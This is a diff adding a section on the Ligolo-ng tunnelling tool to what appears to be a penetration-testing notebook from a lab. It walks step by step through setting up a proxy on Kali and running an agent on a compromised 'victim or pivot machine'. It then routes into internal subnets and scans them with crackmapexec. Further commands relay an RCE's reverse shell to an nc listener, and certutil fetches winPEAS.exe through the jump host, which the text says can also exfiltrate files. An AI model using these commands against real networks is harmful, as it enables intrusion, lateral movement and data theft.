@@ -296,9 +296,117 @@ And we are able to access the "10.200.87.150" web server easily as shown in the 
 
 <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+### <mark style="color:red;">5 - Ligolo-ng</mark>
 
+Download from --> [here](https://github.com/nicocha30/ligolo-ng)
 
+* **Ligolo Proxy:** is run on the attacker machine.
+* **Ligolo Agent:** is run on the pivot/jump host.
 
+#### <mark style="color:orange;">Setting up Ligolo on Kali</mark>
+
+`sudo ip tuntap add user dking mode tun ligolo` - we use our username.
+
+`sudo ip link set ligolo up` - we turn on the interface.
+
+<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+
+`./proxy -selfcert` - and it starts the proxy server listening on port 11601.
+
+#### <mark style="color:orange;">Adding an Agent</mark>
+
+On the Victim or Pivot Machine:
+
+`./agent -connect 10.50.88.51:11601 -ignore-cert` - connect to the kali ip and port, then since we used "selfcert" for the proxy, we just "ignore-cert" here.
+
+And the connection should be established.
+
+<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+
+In the Proxy menu, we can start our interaction:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+ligolo-ng >> help # help menu.
+ligolo-ng >> session # view sessions.
+ligolo-ng >> 1 # select the session number.
+[Agent : root@prod-serv] >> ifconfig # for linux obvoiusly, ipconfig for windows.
+[Agent : root@prod-serv] >> 
+```
+{% endcode %}
+
+#### <mark style="color:orange;">For Pivoting:</mark>
+
+We just added an Agent to the Ligolo Proxy server, now let's add our pivot.
+
+`sudo ip route add 10.200.87.150 dev ligolo` - adding a route to the internal network we want to reach, we could also add a subnet if we like, ie; `sudo ip route add 192.168.0.1/24` .
+
+`ip route list` - to view the routing table.
+
+Back in our proxy tab:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+[Agent : root@prod-serv] >> session # confirm we are in the right session.
+[Agent : root@prod-serv] >> 1 # enter correct session number.
+[Agent : root@prod-serv] >> start # starts the pivot tunnel, we should be able to access the networks added in the routing table.
+```
+{% endcode %}
+
+Now we can use any tool: nmap, crackmapexec, evil-winrm, enum4linux etc, to directly communicate with the internal networks.
+
+One way to verify our Pivot is working is to use "crackmapexec" if SMB or WINRM port is open and check:
+
+`crackmapexec smb 192.168.0.1/24` - if its able to resolve the  names of the live host in the Subnet, then it's working :)
+
+#### <mark style="color:orange;">How to use the Ligolo Listeners to receive a reverse shell connection</mark>
+
+After gaining access to internal networks, in this case "10.200.87.150".  Lets say we found an exploit for this machine, like an RCE or something, and we want to send the reverse shell straight to our kali box, we need to add a Listener to our Ligolo Agent.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# we make sure we are in the Agent Session we want to setup a listener for (in this case, our Pivot/Jump machine).
+# with this cmd, any connection (or reverse shell) from any network (internal networks) "0.0.0.0" on port "1234" should be redirected to our kali localhost on port "4444".
+[Agent : root@prod-serv] >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+
+# so we set a "nc" listener on kali port "4444" to catch the reverse shell, once we have our RCE.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+
+Our RCE:
+
+Let saythis is our RCE, so normally we'd send the reverse shell to our kali ip, while our "nc" listener catches it. But here, if we do that it won't work, so  we will use the ip of our Jump/Pivot agent instead because we already setup a Ligolo Listener (0.0.0.0:1234) on the JUmp agent. This will redirect the reverse shell to our kali box on port "4444". We use the ip of our Jump Host instead of our Kali ip address.
+
+<figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption><p>RCE</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+
+And we get a shell.
+
+#### <mark style="color:orange;">How to use Ligolo Listeners to transfer files to and from machines.</mark>
+
+So after gaining our Reverse shell to the internal network using Ligolo Listener, we are low level user, and we want to upload say WinPEAS, LinPEAS, PowerUP etc, to get priv esc vector for priv esc or maybe we want to exfilterate data/files from the internal network to our kali machine.
+
+We will have to setup another Listener to do File Transfers.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# we are setting a listener to on our Jump host (0.0.0.0:1235) to redirect back to our kali on port "80" because we are going to be running our python server on port 80 too.
+[Agent : root@prod-serv] >> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (98).png" alt=""><figcaption><p>we now have a dedicated listener for file transfers</p></figcaption></figure>
+
+Our server: `python3 -m http.server 80` .
+
+`certutil -urlcache -f http://JumpHost_IP:1235/winPEAS.exe` - so we use the ip addr of our Jump host agent here since we have a listener on "0.0.0.0:1235" that will redirect the connection to our kali machine port "80" which our server is running on.
+
+<figure><img src=".gitbook/assets/image (99).png" alt=""><figcaption><p>successfully transferred file.</p></figcaption></figure>
 
 
 
